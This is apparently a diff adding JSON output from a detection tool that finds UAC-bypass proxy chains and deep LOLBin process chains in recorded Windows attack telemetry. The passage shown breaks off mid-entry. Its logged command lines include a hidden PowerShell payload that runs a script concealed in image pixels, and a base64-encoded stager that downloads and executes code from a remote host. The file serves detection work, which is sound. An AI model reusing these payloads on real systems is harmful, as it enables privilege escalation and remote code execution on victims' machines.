@@ -1,0 +1,3636 @@
+{
+  "auto_elevate_binaries": [
+    "computerdefaults.exe",
+    "eudcedit.exe",
+    "eventvwr.exe",
+    "fodhelper.exe",
+    "iscsicpl.exe",
+    "odbcad32.exe",
+    "sdclt.exe",
+    "wsreset.exe"
+  ],
+  "shells_and_interpreters": [
+    "cmd.exe",
+    "cscript.exe",
+    "mshta.exe",
+    "powershell.exe",
+    "powershell_ise.exe",
+    "pwsh.exe",
+    "wscript.exe"
+  ],
+  "min_depth_for_deep_chain_nodes": 4,
+  "results": {
+    "malicious": {
+      "unique_processes": 1167,
+      "uac_bypass_proxy_chain_hits": [
+        {
+          "detector": "UAC_BYPASS_PROXY_CHAIN",
+          "attack_technique": "T1548.002",
+          "auto_elevate_process_guid": "47ab858c-e1e3-5eac-b503-000000000400",
+          "auto_elevate_image": "C:\\Windows\\System32\\sdclt.exe",
+          "intermediary_process_guid": "47ab858c-e1e3-5eac-b603-000000000400",
+          "intermediary_image": "C:\\Windows\\System32\\control.exe",
+          "shell_process_guid": "47ab858c-e1e4-5eac-b803-000000000400",
+          "shell_image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+          "shell_command_line": "\"PowerShell.exe\" -noni -noexit -ep bypass -window hidden -c \"sal a New-Object;Add-Type -AssemblyName 'System.Drawing'; $g=a System.Drawing.Bitmap('C:\\Users\\pbeesly\\Downloads\\monkey.png');$o=a Byte[] 4480;for($i=0; $i -le 6; $i++){foreach($x in(0..639)){$p=$g.GetPixel($x,$i);$o[$i*640+$x]=([math]::Floor(($p.B-band15)*16)-bor($p.G-band15))}};$g.Dispose();IEX([System.Text.Encoding]::ASCII.GetString($o[0..3932]))\"",
+          "single_hop_visible_node": "intermediary (child of auto-elevating binary) only; a rule keyed on ParentImage=<auto-elevate binary> matches the intermediary event, never the shell event where the payload actually runs"
+        },
+        {
+          "detector": "UAC_BYPASS_PROXY_CHAIN",
+          "attack_technique": "T1548.002",
+          "auto_elevate_process_guid": "8320f18b-280d-5ead-8a05-000000000400",
+          "auto_elevate_image": "C:\\Windows\\System32\\sdclt.exe",
+          "intermediary_process_guid": "8320f18b-280d-5ead-8b05-000000000400",
+          "intermediary_image": "C:\\Windows\\System32\\control.exe",
+          "shell_process_guid": "8320f18b-280e-5ead-8d05-000000000400",
+          "shell_image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+          "shell_command_line": "\"PowerShell.exe\" -exec bypass -Noninteractive -windowstyle hidden -e WwBTAHkAcwB0AGUAbQAuAE4AZQB0AC4AUwBlAHIAdgBpAGMAZQBQAG8AaQBuAHQATQBhAG4AYQBnAGUAcgBdADoAOgBTAGUAcgB2AGUAcgBDAGUAcgB0AGkAZgBpAGMAYQB0AGUAVgBhAGwAaQBkAGEAdABpAG8AbgBDAGEAbABsAGIAYQBjAGsAIAA9ACAAewAkAHQAcgB1AGUAfQA7ACQATQBTAD0AWwBTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAVQBUAEYAOAAuAEcAZQB0AFMAdAByAGkAbgBnACgAWwBTAHkAcwB0AGUAbQAuAEMAbwBuAHYAZQByAHQAXQA6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAHMAeQBzAHQAZQBtAC4AbgBlAHQALgB3AGUAYgBjAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAHMAdAByAGkAbgBnACgAJwBoAHQAdABwAHMAOgAvAC8AMQA5ADIALgAxADYAOAAuADAALgA0ADoANAA0ADMALwBHAG8AUAByAG8ANQAvAGIAbABhAGMAawAvADIAMAAxADgALwBfAHIAcAAnACkAKQApADsASQBFAFgAIAAkAE0AUwA=",
+          "single_hop_visible_node": "intermediary (child of auto-elevating binary) only; a rule keyed on ParentImage=<auto-elevate binary> matches the intermediary event, never the shell event where the payload actually runs"
+        }
+      ],
+      "deep_chain_to_lolbin_hits": [
+        {
+          "detector": "DEEP_CHAIN_TO_LOLBIN",
+          "attack_technique": "T1218",
+          "process_guid": "47ab858c-e1e3-5eac-b603-000000000400",
+          "image": "C:\\Windows\\System32\\control.exe",
+          "lolbin_name": "control.exe",
+          "chain_length_nodes": 4,
+          "ancestor_images": [
+            "C:\\ProgramData\\victim\\\u00e2\u20ac\u00aecod.3aka3.scr",
+            "C:\\Windows\\System32\\cmd.exe",
+            "C:\\Windows\\System32\\sdclt.exe",
+            "C:\\Windows\\System32\\control.exe"
+          ],
+          "single_hop_visible_node": "only the immediate parent-child pair at the bottom of this chain; a rule cannot see how many hops it took to arrive here"
+        },
+        {
+          "detector": "DEEP_CHAIN_TO_LOLBIN",
+          "attack_technique": "T1218",
+          "process_guid": "47ab858c-e1e4-5eac-b903-000000000400",
+          "image": "C:\\Windows\\System32\\conhost.exe",
+          "lolbin_name": "conhost.exe",
+          "chain_length_nodes": 6,
+          "ancestor_images": [
+            "C:\\ProgramData\\victim\\\u00e2\u20ac\u00aecod.3aka3.scr",
+            "C:\\Windows\\System32\\cmd.exe",
+            "C:\\Windows\\System32\\sdclt.exe",
+            "C:\\Windows\\System32\\control.exe",
+            "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+            "C:\\Windows\\System32\\conhost.exe"
+          ],
+          "single_hop_visible_node": "only the immediate parent-child pair at the bottom of this chain; a rule cannot see how many hops it took to arrive here"
+        },
+        {
+          "detector": "DEEP_CHAIN_TO_LOLBIN",
+          "attack_technique": "T1218",
+          "process_guid": "47ab858c-e1e5-5eac-ba03-000000000400",
+          "image": "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe",
+          "lolbin_name": "csc.exe",
+          "chain_length_nodes": 6,
+          "ancestor_images": [
+            "C:\\ProgramData\\victim\\\u00e2\u20ac\u00aecod.3aka3.scr",
+            "C:\\Windows\\System32\\cmd.exe",
+            "C:\\Windows\\System32\\sdclt.exe",
+            "C:\\Windows\\System32\\control.exe",
+            "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+            "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe"
+          ],
+          "single_hop_visible_node": "only the immediate parent-child pair at the bottom of this chain; a rule cannot see how many hops it took to arrive here"
+        },
+        {
+          "detector": "DEEP_CHAIN_TO_LOLBIN",
+          "attack_technique": "T1218",
+          "process_guid": "47ab858c-e23d-5eac-c703-000000000400",
+          "image": "C:\\Windows\\System32\\conhost.exe",
+          "lolbin_name": "conhost.exe",
+          "chain_length_nodes": 7,
+          "ancestor_images": [
+            "C:\\ProgramData\\victim\\\u00e2\u20ac\u00aecod.3aka3.scr",
+            "C:\\Windows\\System32\\cmd.exe",
+            "C:\\Windows\\System32\\sdclt.exe",
+            "C:\\Windows\\System32\\control.exe",
+            "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+            "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+            "C:\\Windows\\System32\\conhost.exe"
+          ],
+          "single_hop_visible_node": "only the immediate parent-child pair at the bottom of this chain; a rule cannot see how many hops it took to arrive here"
+        },
+        {
+          "detector": "DEEP_CHAIN_TO_LOLBIN",
+          "attack_technique": "T1218",
+          "process_guid": "47ab858c-e374-5eac-d903-000000000400",
+          "image": "C:\\Windows\\System32\\conhost.exe",
+          "lolbin_name": "conhost.exe",
+          "chain_length_nodes": 7,
+          "ancestor_images": [
+            "C:\\ProgramData\\victim\\\u00e2\u20ac\u00aecod.3aka3.scr",
+            "C:\\Windows\\System32\\cmd.exe",
+            "C:\\Windows\\System32\\sdclt.exe",
+            "C:\\Windows\\System32\\control.exe",
+            "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+            "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+            "C:\\Windows\\System32\\conhost.exe"
+          ],
+          "single_hop_visible_node": "only the immediate parent-child pair at the bottom of this chain; a rule cannot see how many hops it took to arrive here"
+        },
+        {
+          "detector": "DEEP_CHAIN_TO_LOLBIN",
+          "attack_technique": "T1218",
+          "process_guid": "47ab858c-e394-5eac-e303-000000000400",
+          "image": "C:\\Windows\\System32\\conhost.exe",
+          "lolbin_name": "conhost.exe",
+          "chain_length_nodes": 8,
+          "ancestor_images": [
+            "C:\\ProgramData\\victim\\\u00e2\u20ac\u00aecod.3aka3.scr",
+            "C:\\Windows\\System32\\cmd.exe",
+            "C:\\Windows\\System32\\sdclt.exe",
+            "C:\\Windows\\System32\\control.exe",
+            "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+            "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+            "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+            "C:\\Windows\\System32\\conhost.exe"
+          ],
+          "single_hop_visible_node": "only the immediate parent-child pair at the bottom of this chain; a rule cannot see how many hops it took to arrive here"
+        },
+        {
+          "detector": "DEEP_CHAIN_TO_LOLBIN",
+          "attack_technique": "T1218",
+          "process_guid": "47ab858c-e3d3-5eac-e703-000000000400",
+          "image": "C:\\Windows\\System32\\conhost.exe",
+          "lolbin_name": "conhost.exe",
+          "chain_length_nodes": 8,
+          "ancestor_images": [
+            "C:\\ProgramData\\victim\\\u00e2\u20ac\u00aecod.3aka3.scr",
+            "C:\\Windows\\System32\\cmd.exe",
+            "C:\\Windows\\System32\\sdclt.exe",
+            "C:\\Windows\\System32\\control.exe",
+            "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+            "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+            "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+            "C:\\Windows\\System32\\conhost.exe"
+          ],
+          "single_hop_visible_node": "only the immediate parent-child pair at the bottom of this chain; a rule cannot see how many hops it took to arrive here"
+        },
+        {
+          "detector": "DEEP_CHAIN_TO_LOLBIN",
+          "attack_technique": "T1218",
+          "process_guid": "47ab858c-e413-5eac-e803-000000000400",
+          "image": "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe",
+          "lolbin_name": "csc.exe",
+          "chain_length_nodes": 7,
+          "ancestor_images": [
+            "C:\\ProgramData\\victim\\\u00e2\u20ac\u00aecod.3aka3.scr",
+            "C:\\Windows\\System32\\cmd.exe",
+            "C:\\Windows\\System32\\sdclt.exe",
+            "C:\\Windows\\System32\\control.exe",
+            "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+            "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+            "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe"
+          ],
+          "single_hop_visible_node": "only the immediate parent-child pair at the bottom of this chain; a rule cannot see how many hops it took to arrive here"
+        },
+        {
+          "detector": "DEEP_CHAIN_TO_LOLBIN",
+          "attack_technique": "T1218",
+          "process_guid": "5aa8ec29-e618-5eac-7e03-000000000400",
+          "image": "C:\\Windows\\System32\\cmd.exe",
+          "lolbin_name": "cmd.exe",
+          "chain_length_nodes": 4,
+          "ancestor_images": [
+            "C:\\Windows\\PSEXESVC.exe",
+            "C:\\Windows\\Temp\\python.exe",
+            "C:\\Windows\\Temp\\python.exe",
+            "C:\\Windows\\System32\\cmd.exe"
+          ],
+          "single_hop_visible_node": "only the immediate parent-child pair at the bottom of this chain; a rule cannot see how many hops it took to arrive here"
+        },
+        {
+          "detector": "DEEP_CHAIN_TO_LOLBIN",
+          "attack_technique": "T1218",
+          "process_guid": "47ab858c-e6b2-5eac-5900-000000000500",
+          "image": "C:\\Windows\\System32\\rundll32.exe",
+          "lolbin_name": "rundll32.exe",
+          "chain_length_nodes": 6,
+          "ancestor_images": [
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\wininit.exe",
+            "C:\\Windows\\System32\\services.exe",
+            "C:\\Windows\\System32\\javamtsup.exe",
+            "C:\\Windows\\System32\\rundll32.exe"
+          ],
+          "single_hop_visible_node": "only the immediate parent-child pair at the bottom of this chain; a rule cannot see how many hops it took to arrive here"
+        },
+        {
+          "detector": "DEEP_CHAIN_TO_LOLBIN",
+          "attack_technique": "T1218",
+          "process_guid": "47ab858c-e6b3-5eac-5c00-000000000500",
+          "image": "C:\\Windows\\System32\\conhost.exe",
+          "lolbin_name": "conhost.exe",
+          "chain_length_nodes": 7,
+          "ancestor_images": [
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\wininit.exe",
+            "C:\\Windows\\System32\\services.exe",
+            "C:\\WindowsAzure\\Packages\\WaAppAgent.exe",
+            "C:\\Windows\\System32\\wevtutil.exe",
+            "C:\\Windows\\System32\\conhost.exe"
+          ],
+          "single_hop_visible_node": "only the immediate parent-child pair at the bottom of this chain; a rule cannot see how many hops it took to arrive here"
+        },
+        {
+          "detector": "DEEP_CHAIN_TO_LOLBIN",
+          "attack_technique": "T1218",
+          "process_guid": "47ab858c-e6b5-5eac-5e00-000000000500",
+          "image": "C:\\Windows\\System32\\netsh.exe",
+          "lolbin_name": "netsh.exe",
+          "chain_length_nodes": 6,
+          "ancestor_images": [
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\wininit.exe",
+            "C:\\Windows\\System32\\services.exe",
+            "C:\\Packages\\Plugins\\Microsoft.Azure.NetworkWatcher.NetworkWatcherAgentWindows\\1.4.1421.1\\NetworkWatcherAgent\\NetworkWatcherAgent.exe",
+            "C:\\Windows\\System32\\netsh.exe"
+          ],
+          "single_hop_visible_node": "only the immediate parent-child pair at the bottom of this chain; a rule cannot see how many hops it took to arrive here"
+        },
+        {
+          "detector": "DEEP_CHAIN_TO_LOLBIN",
+          "attack_technique": "T1218",
+          "process_guid": "47ab858c-e6b5-5eac-5d00-000000000500",
+          "image": "C:\\Windows\\System32\\conhost.exe",
+          "lolbin_name": "conhost.exe",
+          "chain_length_nodes": 7,
+          "ancestor_images": [
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\wininit.exe",
+            "C:\\Windows\\System32\\services.exe",
+            "C:\\Windows\\System32\\svchost.exe",
+            "C:\\Windows\\System32\\dsregcmd.exe",
+            "C:\\Windows\\System32\\conhost.exe"
+          ],
+          "single_hop_visible_node": "only the immediate parent-child pair at the bottom of this chain; a rule cannot see how many hops it took to arrive here"
+        },
+        {
+          "detector": "DEEP_CHAIN_TO_LOLBIN",
+          "attack_technique": "T1218",
+          "process_guid": "47ab858c-e6b5-5eac-5f00-000000000500",
+          "image": "C:\\Windows\\System32\\conhost.exe",
+          "lolbin_name": "conhost.exe",
+          "chain_length_nodes": 7,
+          "ancestor_images": [
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\wininit.exe",
+            "C:\\Windows\\System32\\services.exe",
+            "C:\\Packages\\Plugins\\Microsoft.Azure.NetworkWatcher.NetworkWatcherAgentWindows\\1.4.1421.1\\NetworkWatcherAgent\\NetworkWatcherAgent.exe",
+            "C:\\Windows\\System32\\netsh.exe",
+            "C:\\Windows\\System32\\conhost.exe"
+          ],
+          "single_hop_visible_node": "only the immediate parent-child pair at the bottom of this chain; a rule cannot see how many hops it took to arrive here"
+        },
+        {
+          "detector": "DEEP_CHAIN_TO_LOLBIN",
+          "attack_technique": "T1218",
+          "process_guid": "47ab858c-e6b5-5eac-6100-000000000500",
+          "image": "C:\\Windows\\System32\\conhost.exe",
+          "lolbin_name": "conhost.exe",
+          "chain_length_nodes": 7,
+          "ancestor_images": [
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\wininit.exe",
+            "C:\\Windows\\System32\\services.exe",
+            "C:\\WindowsAzure\\WindowsAzureNetAgent_1.0.0.143\\WindowsAzureNetAgent\\WindowsAzureNetAgent.exe",
+            "C:\\WindowsAzure\\WindowsAzureNetAgent_1.0.0.143\\WindowsAzureNetAgent\\Plugins\\VFPlugin\\Code\\VFPlugin.exe",
+            "C:\\Windows\\System32\\conhost.exe"
+          ],
+          "single_hop_visible_node": "only the immediate parent-child pair at the bottom of this chain; a rule cannot see how many hops it took to arrive here"
+        },
+        {
+          "detector": "DEEP_CHAIN_TO_LOLBIN",
+          "attack_technique": "T1218",
+          "process_guid": "47ab858c-e6b7-5eac-6800-000000000500",
+          "image": "C:\\Windows\\System32\\conhost.exe",
+          "lolbin_name": "conhost.exe",
+          "chain_length_nodes": 7,
+          "ancestor_images": [
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\wininit.exe",
+            "C:\\Windows\\System32\\services.exe",
+            "C:\\WindowsAzure\\Packages\\WaAppAgent.exe",
+            "C:\\Windows\\System32\\wevtutil.exe",
+            "C:\\Windows\\System32\\conhost.exe"
+          ],
+          "single_hop_visible_node": "only the immediate parent-child pair at the bottom of this chain; a rule cannot see how many hops it took to arrive here"
+        },
+        {
+          "detector": "DEEP_CHAIN_TO_LOLBIN",
+          "attack_technique": "T1218",
+          "process_guid": "47ab858c-e6bb-5eac-6d00-000000000500",
+          "image": "C:\\Windows\\System32\\conhost.exe",
+          "lolbin_name": "conhost.exe",
+          "chain_length_nodes": 8,
+          "ancestor_images": [
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\wininit.exe",
+            "C:\\Windows\\System32\\services.exe",
+            "C:\\Packages\\Plugins\\Microsoft.Azure.NetworkWatcher.NetworkWatcherAgentWindows\\1.4.1421.1\\NetworkWatcherAgent\\NetworkWatcherAgent.exe",
+            "C:\\Windows\\System32\\netsh.exe",
+            "C:\\Windows\\System32\\dispdiag.exe",
+            "C:\\Windows\\System32\\conhost.exe"
+          ],
+          "single_hop_visible_node": "only the immediate parent-child pair at the bottom of this chain; a rule cannot see how many hops it took to arrive here"
+        },
+        {
+          "detector": "DEEP_CHAIN_TO_LOLBIN",
+          "attack_technique": "T1218",
+          "process_guid": "47ab858c-e6bc-5eac-6f00-000000000500",
+          "image": "C:\\Windows\\System32\\conhost.exe",
+          "lolbin_name": "conhost.exe",
+          "chain_length_nodes": 7,
+          "ancestor_images": [
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\wininit.exe",
+            "C:\\Windows\\System32\\services.exe",
+            "C:\\WindowsAzure\\Packages\\GuestAgent\\WindowsAzureGuestAgent.exe",
+            "C:\\Windows\\System32\\ipconfig.exe",
+            "C:\\Windows\\System32\\conhost.exe"
+          ],
+          "single_hop_visible_node": "only the immediate parent-child pair at the bottom of this chain; a rule cannot see how many hops it took to arrive here"
+        },
+        {
+          "detector": "DEEP_CHAIN_TO_LOLBIN",
+          "attack_technique": "T1218",
+          "process_guid": "47ab858c-e6bc-5eac-7100-000000000500",
+          "image": "C:\\Windows\\System32\\conhost.exe",
+          "lolbin_name": "conhost.exe",
+          "chain_length_nodes": 7,
+          "ancestor_images": [
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\wininit.exe",
+            "C:\\Windows\\System32\\services.exe",
+            "C:\\WindowsAzure\\Packages\\GuestAgent\\WindowsAzureGuestAgent.exe",
+            "C:\\Windows\\System32\\ROUTE.EXE",
+            "C:\\Windows\\System32\\conhost.exe"
+          ],
+          "single_hop_visible_node": "only the immediate parent-child pair at the bottom of this chain; a rule cannot see how many hops it took to arrive here"
+        },
+        {
+          "detector": "DEEP_CHAIN_TO_LOLBIN",
+          "attack_technique": "T1218",
+          "process_guid": "47ab858c-e6bc-5eac-7200-000000000500",
+          "image": "C:\\Windows\\System32\\netsh.exe",
+          "lolbin_name": "netsh.exe",
+          "chain_length_nodes": 6,
+          "ancestor_images": [
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\wininit.exe",
+            "C:\\Windows\\System32\\services.exe",
+            "C:\\Packages\\Plugins\\Microsoft.Azure.NetworkWatcher.NetworkWatcherAgentWindows\\1.4.1421.1\\NetworkWatcherAgent\\NetworkWatcherAgent.exe",
+            "C:\\Windows\\System32\\netsh.exe"
+          ],
+          "single_hop_visible_node": "only the immediate parent-child pair at the bottom of this chain; a rule cannot see how many hops it took to arrive here"
+        },
+        {
+          "detector": "DEEP_CHAIN_TO_LOLBIN",
+          "attack_technique": "T1218",
+          "process_guid": "47ab858c-e6bc-5eac-7300-000000000500",
+          "image": "C:\\Windows\\System32\\conhost.exe",
+          "lolbin_name": "conhost.exe",
+          "chain_length_nodes": 7,
+          "ancestor_images": [
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\wininit.exe",
+            "C:\\Windows\\System32\\services.exe",
+            "C:\\Packages\\Plugins\\Microsoft.Azure.NetworkWatcher.NetworkWatcherAgentWindows\\1.4.1421.1\\NetworkWatcherAgent\\NetworkWatcherAgent.exe",
+            "C:\\Windows\\System32\\netsh.exe",
+            "C:\\Windows\\System32\\conhost.exe"
+          ],
+          "single_hop_visible_node": "only the immediate parent-child pair at the bottom of this chain; a rule cannot see how many hops it took to arrive here"
+        },
+        {
+          "detector": "DEEP_CHAIN_TO_LOLBIN",
+          "attack_technique": "T1218",
+          "process_guid": "47ab858c-e6bd-5eac-7500-000000000500",
+          "image": "C:\\Windows\\System32\\conhost.exe",
+          "lolbin_name": "conhost.exe",
+          "chain_length_nodes": 7,
+          "ancestor_images": [
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\wininit.exe",
+            "C:\\Windows\\System32\\services.exe",
+            "C:\\WindowsAzure\\Packages\\GuestAgent\\WindowsAzureGuestAgent.exe",
+            "C:\\Windows\\System32\\ARP.EXE",
+            "C:\\Windows\\System32\\conhost.exe"
+          ],
+          "single_hop_visible_node": "only the immediate parent-child pair at the bottom of this chain; a rule cannot see how many hops it took to arrive here"
+        },
+        {
+          "detector": "DEEP_CHAIN_TO_LOLBIN",
+          "attack_technique": "T1218",
+          "process_guid": "47ab858c-e6c1-5eac-7900-000000000500",
+          "image": "C:\\Windows\\System32\\conhost.exe",
+          "lolbin_name": "conhost.exe",
+          "chain_length_nodes": 7,
+          "ancestor_images": [
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\wininit.exe",
+            "C:\\Windows\\System32\\services.exe",
+            "C:\\WindowsAzure\\Packages\\WaAppAgent.exe",
+            "C:\\Windows\\System32\\logman.exe",
+            "C:\\Windows\\System32\\conhost.exe"
+          ],
+          "single_hop_visible_node": "only the immediate parent-child pair at the bottom of this chain; a rule cannot see how many hops it took to arrive here"
+        },
+        {
+          "detector": "DEEP_CHAIN_TO_LOLBIN",
+          "attack_technique": "T1218",
+          "process_guid": "47ab858c-e6c2-5eac-7a00-000000000500",
+          "image": "C:\\Windows\\System32\\conhost.exe",
+          "lolbin_name": "conhost.exe",
+          "chain_length_nodes": 7,
+          "ancestor_images": [
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\wininit.exe",
+            "C:\\Windows\\System32\\services.exe",
+            "C:\\WindowsAzure\\Packages\\Telemetry\\WindowsAzureTelemetryService.exe",
+            "C:\\Windows\\System32\\ipconfig.exe",
+            "C:\\Windows\\System32\\conhost.exe"
+          ],
+          "single_hop_visible_node": "only the immediate parent-child pair at the bottom of this chain; a rule cannot see how many hops it took to arrive here"
+        },
+        {
+          "detector": "DEEP_CHAIN_TO_LOLBIN",
+          "attack_technique": "T1218",
+          "process_guid": "47ab858c-e6c2-5eac-7c00-000000000500",
+          "image": "C:\\Windows\\System32\\conhost.exe",
+          "lolbin_name": "conhost.exe",
+          "chain_length_nodes": 7,
+          "ancestor_images": [
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\wininit.exe",
+            "C:\\Windows\\System32\\services.exe",
+            "C:\\WindowsAzure\\Packages\\WaAppAgent.exe",
+            "C:\\Windows\\System32\\logman.exe",
+            "C:\\Windows\\System32\\conhost.exe"
+          ],
+          "single_hop_visible_node": "only the immediate parent-child pair at the bottom of this chain; a rule cannot see how many hops it took to arrive here"
+        },
+        {
+          "detector": "DEEP_CHAIN_TO_LOLBIN",
+          "attack_technique": "T1218",
+          "process_guid": "47ab858c-e6c7-5eac-8000-000000000500",
+          "image": "C:\\Windows\\System32\\conhost.exe",
+          "lolbin_name": "conhost.exe",
+          "chain_length_nodes": 7,
+          "ancestor_images": [
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\wininit.exe",
+            "C:\\Windows\\System32\\services.exe",
+            "C:\\WindowsAzure\\Packages\\Telemetry\\WindowsAzureTelemetryService.exe",
+            "C:\\Windows\\System32\\ROUTE.EXE",
+            "C:\\Windows\\System32\\conhost.exe"
+          ],
+          "single_hop_visible_node": "only the immediate parent-child pair at the bottom of this chain; a rule cannot see how many hops it took to arrive here"
+        },
+        {
+          "detector": "DEEP_CHAIN_TO_LOLBIN",
+          "attack_technique": "T1218",
+          "process_guid": "47ab858c-e6ce-5eac-8300-000000000500",
+          "image": "C:\\Windows\\System32\\conhost.exe",
+          "lolbin_name": "conhost.exe",
+          "chain_length_nodes": 7,
+          "ancestor_images": [
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\wininit.exe",
+            "C:\\Windows\\System32\\services.exe",
+            "C:\\WindowsAzure\\Packages\\Telemetry\\WindowsAzureTelemetryService.exe",
+            "C:\\Windows\\System32\\ARP.EXE",
+            "C:\\Windows\\System32\\conhost.exe"
+          ],
+          "single_hop_visible_node": "only the immediate parent-child pair at the bottom of this chain; a rule cannot see how many hops it took to arrive here"
+        },
+        {
+          "detector": "DEEP_CHAIN_TO_LOLBIN",
+          "attack_technique": "T1218",
+          "process_guid": "47ab858c-e6ce-5eac-8400-000000000500",
+          "image": "C:\\Windows\\System32\\conhost.exe",
+          "lolbin_name": "conhost.exe",
+          "chain_length_nodes": 7,
+          "ancestor_images": [
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\wininit.exe",
+            "C:\\Windows\\System32\\services.exe",
+            "C:\\WindowsAzure\\Packages\\WaAppAgent.exe",
+            "C:\\Windows\\System32\\logman.exe",
+            "C:\\Windows\\System32\\conhost.exe"
+          ],
+          "single_hop_visible_node": "only the immediate parent-child pair at the bottom of this chain; a rule cannot see how many hops it took to arrive here"
+        },
+        {
+          "detector": "DEEP_CHAIN_TO_LOLBIN",
+          "attack_technique": "T1218",
+          "process_guid": "47ab858c-e6d0-5eac-8600-000000000500",
+          "image": "C:\\Windows\\System32\\conhost.exe",
+          "lolbin_name": "conhost.exe",
+          "chain_length_nodes": 7,
+          "ancestor_images": [
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\wininit.exe",
+            "C:\\Windows\\System32\\services.exe",
+            "C:\\WindowsAzure\\Packages\\WaAppAgent.exe",
+            "C:\\Windows\\System32\\logman.exe",
+            "C:\\Windows\\System32\\conhost.exe"
+          ],
+          "single_hop_visible_node": "only the immediate parent-child pair at the bottom of this chain; a rule cannot see how many hops it took to arrive here"
+        },
+        {
+          "detector": "DEEP_CHAIN_TO_LOLBIN",
+          "attack_technique": "T1218",
+          "process_guid": "47ab858c-e6d3-5eac-8800-000000000500",
+          "image": "C:\\Windows\\System32\\sc.exe",
+          "lolbin_name": "sc.exe",
+          "chain_length_nodes": 6,
+          "ancestor_images": [
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\wininit.exe",
+            "C:\\Windows\\System32\\services.exe",
+            "C:\\WindowsAzure\\Packages\\WaAppAgent.exe",
+            "C:\\Windows\\System32\\sc.exe"
+          ],
+          "single_hop_visible_node": "only the immediate parent-child pair at the bottom of this chain; a rule cannot see how many hops it took to arrive here"
+        },
+        {
+          "detector": "DEEP_CHAIN_TO_LOLBIN",
+          "attack_technique": "T1218",
+          "process_guid": "47ab858c-e6d4-5eac-8900-000000000500",
+          "image": "C:\\Windows\\System32\\conhost.exe",
+          "lolbin_name": "conhost.exe",
+          "chain_length_nodes": 7,
+          "ancestor_images": [
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\smss.exe",
+            "C:\\Windows\\System32\\wininit.exe",
+            "C:\\Windows\\System32\\services.exe",
+            "C:\\WindowsAzure\\Packages\\WaAppAgent.exe",
+            "C:\\Windows\\System32\\sc.exe",
+            "C:\\Windows\\System32\\conhost.exe"
+          ],
+          "single_hop_visible_node": "only the immediate parent-child pair at the bottom of this chain; a rule cannot see how many hops it took to arrive here"
+        },
+        {
+          "detector": "DEEP_CHAIN_TO_LOLBIN",
+          "attack_technique": "T1218",
+          "process_guid": "47ab858c-e6d7-5eac-8c00-000000000500",
+          "image": "C:\\Windows\\System32\\sc.exe",
+          "lolbin_name": "sc.exe",
